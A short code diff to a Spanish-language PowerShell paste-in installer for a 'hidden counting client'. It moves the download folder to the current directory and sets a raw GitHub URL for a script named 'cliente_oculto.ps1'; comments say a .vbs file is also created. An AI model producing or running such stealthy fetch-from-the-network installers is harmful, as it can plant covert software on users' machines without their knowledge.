@@ -2,10 +2,9 @@
 #  Instala el cliente de conteo oculto (descarga .ps1 + crea .vbs)
 #  Pega TODO esto en PowerShell y presiona Enter.
 # ============================================================
-$dest = "$env:USERPROFILE\Conteo"      # <-- carpeta destino (cambiala si quieres)
+$dest = (Get-Location).Path            # <-- descarga en el directorio ACTUAL de la terminal
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-New-Item -ItemType Directory -Force -Path $dest | Out-Null
 
 $urlPs1  = 'https://raw.githubusercontent.com/garfield310798-cyber/aaa/main/cliente_oculto.ps1'
 $rutaPs1 = Join-Path $dest 'cliente_oculto.ps1'
